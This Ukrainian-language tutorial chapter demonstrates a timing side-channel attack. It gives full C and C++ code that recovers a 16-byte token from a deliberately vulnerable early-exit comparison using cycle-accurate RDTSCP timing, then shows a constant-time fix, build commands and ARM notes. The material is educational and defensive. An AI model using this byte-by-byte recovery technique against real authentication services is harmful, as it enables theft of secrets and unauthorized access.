# ⚙️ Практична реалізація та експлойт таймінг-атаки

Практична демонстрація експлуатації часового витоку дозволяє на власному досвіді побачити, як наносекундні варіації в коді порівняння рядків призводять до повного зламу криптографічної автентифікації. У цьому проектному розділі наведено повноцінний стенд: сервер із вразливою функцією перевірки токена (на основі стандартного раннього виходу), високоточний інструмент вимірювання процесорних циклів, статистичний аналізатор та алгоритм побайтового відновлення секрету.

## Постановка задачі та модель загроз

Розглядається мережева або локальна служба авторизації. Сервер зберігає секретний автентифікаційний токен фіксованої довжини (16 байтів). Клієнт передає свій варіант токена для отримання доступу. Сервер перевіряє збіг за допомогою класичного побайтового циклу з достроковим перериванням `break` або виклику стандартної функції `memcmp()` при першому неспівпадінні байтів.

Модель можливостей атакуючого:
1. Атакуючий не має прямого доступу до оперативної пам'яті сервера чи його файлової системи;
2. Атакуючий має можливість надсилати необмежену кількість запитів на перевірку автентифікаційного токена;
3. Атакуючий має можливість з високою точністю вимірювати тривалість обробки кожного окремого запиту за допомогою апаратного лічильника тактів або мережевого сокета.

Мета атакуючого полягає в тому, щоб відновити всі 16 байтів секретного токена, звівши експоненційну складність повного перебору з `256¹⁶` (приблизно `3.4 · 10³⁸` комбінацій) до лінійної складності `16 · 256 = 4096` серій вимірювань.

## Архітектура вимірювального стенду

Для отримання достовірних результатів на рівні процесорних тактів вимірювальний стенд використовує інструкцію `RDTSCP` архітектури x86_64, яка повертає поточне значення 64-бітного лічильника часу (Time Stamp Counter, TSC).

Сучасні процесори з позачерговим виконанням інструкцій (Out-of-Order Execution) можуть перевпорядковувати операції читання таймера відносно досліджуваного коду. Для уникнення спекулятивного викривлення вимірювань перед і після виклику `RDTSCP` встановлюються інструкції бар'єра завантаження `LFENCE`, які примусово серіалізують конвеєр процесора.

Для стабілізації експерименту на реальних операційних системах рекомендується прив'язати процес до конкретного фізичного ядра процесора за допомогою системного виклику `sched_setaffinity` в Linux або `SetThreadAffinityMask` у Windows. Це запобігає міграції потоку між ядрами з різними базовими частотами та відключає вплив перемикання енергозберігаючих режимів CPU (C-states / P-states).

## Програмний код: вразливий сервер, експлойт та захищений порівнювач

Нижче наведено повну реалізацію експерименту двома мовами: C та ідіоматичною C++20.

:::tabs
```c
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <x86intrin.h>

#define TOKEN_LEN 16
#define SAMPLES_PER_BYTE 10000

/* Секретний токен сервера, прихований від клієнта */
static const uint8_t SECRET_TOKEN[TOKEN_LEN] = {
    0x53, 0x65, 0x63, 0x75, 0x72, 0x65, 0x50, 0x61,
    0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, 0x34, 0x32
};

/* Штучне навантаження для імітації затримки порівняння */
static void work_delay(void) {
    volatile int dummy = 0;
    for (int i = 0; i < 50; ++i) {
        dummy += i;
    }
}

/* ВРАЗЛИВА функція перевірки: ранній вихід при першому неспівпадінні */
bool vulnerable_verify(const uint8_t *user_token, size_t len) {
    if (len != TOKEN_LEN) {
        return false;
    }
    for (size_t i = 0; i < TOKEN_LEN; ++i) {
        work_delay(); /* Імітація обробки байта */
        if (user_token[i] != SECRET_TOKEN[i]) {
            return false; /* Ранній вихід: витік часу! */
        }
    }
    return true;
}

/* ЗАХИЩЕНА функція перевірки: константний час виконання */
bool constant_time_verify(const uint8_t *user_token, size_t len) {
    if (len != TOKEN_LEN) {
        return false;
    }
    uint8_t diff = 0;
    for (size_t i = 0; i < TOKEN_LEN; ++i) {
        work_delay(); /* Однакове навантаження */
        diff |= (user_token[i] ^ SECRET_TOKEN[i]);
    }
    /* Компіляторний бар'єр проти оптимізації */
    __asm__ __volatile__("" : "+r"(diff) : : "memory");
    return (diff == 0);
}

/* Замір часу виконання в тактах процесора через rdtsc */
static inline uint64_t measure_cycles(const uint8_t *candidate, bool (*verify_fn)(const uint8_t*, size_t)) {
    unsigned int aux;
    _mm_lfence(); /* Бар'єр серіалізації інструкцій */
    uint64_t start = __rdtscp(&aux);
    _mm_lfence();

    volatile bool res = verify_fn(candidate, TOKEN_LEN);
    (void)res;

    _mm_lfence();
    uint64_t end = __rdtscp(&aux);
    _mm_lfence();

    return end - start;
}

/* Алгоритм атаки: побайтове відновлення секрету */
void run_timing_attack(bool (*verify_fn)(const uint8_t*, size_t), const char *target_name) {
    uint8_t recovered[TOKEN_LEN] = {0};
    printf("=== Запуск таймінг-атаки на: %s ===\n", target_name);

    for (size_t pos = 0; pos < TOKEN_LEN; ++pos) {
        uint64_t max_avg_cycles = 0;
        uint8_t best_byte = 0;

        for (int candidate = 0; candidate < 256; ++candidate) {
            recovered[pos] = (uint8_t)candidate;
            uint64_t total_cycles = 0;

            for (int s = 0; s < SAMPLES_PER_BYTE; ++s) {
                total_cycles += measure_cycles(recovered, verify_fn);
            }

            uint64_t avg = total_cycles / SAMPLES_PER_BYTE;
            if (avg > max_avg_cycles) {
                max_avg_cycles = avg;
                best_byte = (uint8_t)candidate;
            }
        }

        recovered[pos] = best_byte;
        printf("Позиція %02zu: знайдено байт 0x%02X ('%c') [сер. час: %lu тактів]\n",
               pos, best_byte, (best_byte >= 32 && best_byte <= 126) ? best_byte : '.', (unsigned long)max_avg_cycles);
    }

    printf("Відновлений рядок: \"");
    for (size_t i = 0; i < TOKEN_LEN; ++i) {
        printf("%c", recovered[i]);
    }
    printf("\"\n\n");
}

int main(void) {
    run_timing_attack(vulnerable_verify, "Вразливий алгоритм (Early-Exit)");
    return 0;
}
```
```cpp
#include <iostream>
#include <vector>
#include <array>
#include <string_view>
#include <chrono>
#include <numeric>
#include <algorithm>
#include <span>
#include <x86intrin.h>

namespace timing_demo {

constexpr size_t TOKEN_LEN = 16;
constexpr size_t SAMPLES_PER_BYTE = 10000;

const std::array<uint8_t, TOKEN_LEN> SECRET_TOKEN = {
    0x53, 0x65, 0x63, 0x75, 0x72, 0x65, 0x50, 0x61,
    0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, 0x34, 0x32
};

void work_delay() noexcept {
    volatile int dummy = 0;
    for (int i = 0; i < 50; ++i) {
        dummy += i;
    }
}

// Вразлива перевірка: ранній вихід
bool vulnerable_verify(std::span<const uint8_t> user_token) noexcept {
    if (user_token.size() != TOKEN_LEN) {
        return false;
    }
    for (size_t i = 0; i < TOKEN_LEN; ++i) {
        work_delay();
        if (user_token[i] != SECRET_TOKEN[i]) {
            return false; // Витік часу
        }
    }
    return true;
}

// Захищена перевірка: константний час
bool constant_time_verify(std::span<const uint8_t> user_token) noexcept {
    if (user_token.size() != TOKEN_LEN) {
        return false;
    }
    uint8_t diff = 0;
    for (size_t i = 0; i < TOKEN_LEN; ++i) {
        work_delay();
        diff |= (user_token[i] ^ SECRET_TOKEN[i]);
    }
    asm volatile("" : "+r"(diff) : : "memory");
    return (diff == 0);
}

// Вимірювання циклів через RDTSCP
template <typename VerifyFn>
uint64_t measure_cycles(std::span<const uint8_t> candidate, VerifyFn&& verify_fn) noexcept {
    unsigned int aux = 0;
    _mm_lfence();
    uint64_t start = __rdtscp(&aux);
    _mm_lfence();

    volatile bool res = verify_fn(candidate);
    (void)res;

    _mm_lfence();
    uint64_t end = __rdtscp(&aux);
    _mm_lfence();

    return end - start;
}

void execute_attack(std::string_view target_name, auto verify_fn) {
    std::array<uint8_t, TOKEN_LEN> recovered{};
    std::cout << "=== Запуск таймінг-атаки на: " << target_name << " ===\n";

    for (size_t pos = 0; pos < TOKEN_LEN; ++pos) {
        uint64_t max_avg_cycles = 0;
        uint8_t best_byte = 0;

        for (int candidate = 0; candidate < 256; ++candidate) {
            recovered[pos] = static_cast<uint8_t>(candidate);
            uint64_t total_cycles = 0;

            for (size_t s = 0; s < SAMPLES_PER_BYTE; ++s) {
                total_cycles += measure_cycles(recovered, verify_fn);
            }

            uint64_t avg = total_cycles / SAMPLES_PER_BYTE;
            if (avg > max_avg_cycles) {
                max_avg_cycles = avg;
                best_byte = static_cast<uint8_t>(candidate);
            }
        }

        recovered[pos] = best_byte;
        std::cout << "Позиція " << pos << ": знайдено байт 0x" << std::hex << static_cast<int>(best_byte)
                  << " ('" << static_cast<char>(best_byte) << "')"
                  << " [сер. час: " << std::dec << max_avg_cycles << " тактів]\n";
    }

    std::cout << "Відновлений токен: \"";
    for (uint8_t b : recovered) {
        std::cout << static_cast<char>(b);
    }
    std::cout << "\"\n\n";
}

} // namespace timing_demo

int main() {
    timing_demo::execute_attack("Вразливий алгоритм (Early-Exit)", timing_demo::vulnerable_verify);
    return 0;
}
```
:::

## Покроковий аналіз виконання вимірювального циклу

Під час виконання атаки на вразливу функцію `vulnerable_verify` програма здійснює систематичний перебір простору станів:

1. **Ініціалізація та розігрів кешу:** Перед початком вимірювань виконується кілька «холостих» викликів для завантаження коду функцій та структур даних у кеш L1I / L1D. Це усуває первинний сплеск латентності, пов'язаний з першим завантаженням сторінок пам'яті (Page Faults).
2. **Сканування позиції 0:** Перебираються значення від `0x00` до `0xFF`. Для 255 хибних значень цикл перевірки завершується на першому кроці, показуючи середню тривалість близько 320 тактів. Для єдиного правильного значення `0x53` (символ `'S'`) функція проходить на другу ітерацію, і час виконання підскакує до 450 тактів.
3. **Фіксація знайденого префікса:** Значення `0x53` записується у нульовий байт масиву `recovered`, і алгоритм переходить до позиції 1.
4. **Сканування позицій 1..15:** Для кожної наступної позиції правильний кандидат демонструє додатковий приріст латентності на фіксовану величину затримки `work_delay()`.

У результаті атакуючий повністю відновлює рядок `"SecurePassword42"` менш ніж за 4000 серій замірів без жодного збою.

## Верифікація стійкості захищеного алгоритму

При тестуванні функції `constant_time_verify` картина кардинально змінюється:
- Для всіх 256 значень-кандидатів на кожній позиції середній час виконання залишається суворо ідентичним (приблизно 2100 тактів, що відповідає повному проходженню всіх 16 ітерацій циклу);
- Різниця середніх між кандидатами лежить у межах нормального статистичного шуму (менше 1–2 тактів);
- Алгоритм вибору максимального середнього перестає знаходити істинний байт і повертає випадковий псевдобайт.

## Інструкція зі збірки та аналіз дизасемблера

Для компіляції тестового стенду рекомендується використовувати сучасний компілятор GCC або Clang з явним зазначенням архітектури та рівня оптимізації:

```
gcc -O2 -march=native -Wall -Wextra demo.c -o demo_c
g++ -O2 -std=c++20 -march=native -Wall -Wextra demo.cpp -o demo_cpp
```

При аналізі згенерованого машинного коду через `objdump -d -M intel demo_c` можна чітко простежити різницю:
- У тілі `vulnerable_verify` присутня інструкція `jne` (Jump if Not Equal), яка перериває виконання та веде на епілог функції з поверненням `0`.
- У тілі `constant_time_verify` присутній компактний лінійний цикл з інструкціями `xor`, `or` та `inc`, який виконує рівно 16 ітерацій без жодних інструкцій переходів всередині тіла порівняння.

## Особливості портування на архітектуру ARM та операційні системи

На процесорах архітектури ARM (ARMv8-A / ARMv9-A) замість інструкції `RDTSCP` прямий замір лічильника тактів у просторі користувача здійснюється читанням віртуального лічильника `CNTVCT_EL0` за допомогою асемблерної інструкції `mrs x0, cntvct_el0`. Для серіалізації виконання інструкцій на ARM застосовується бар'єр синхронізації інструкцій `ISB` (Instruction Synchronization Barrier) замість x86 `LFENCE`.

На рівні системних викликів у кросплатформному коді високу точність забезпечує функція `clock_gettime(CLOCK_MONOTONIC_RAW, &ts)` у Linux та `QueryPerformanceCounter` у Windows, які звертаються до апаратних таймерів HPET або TSC з субмікросекундною роздільною здатністю.
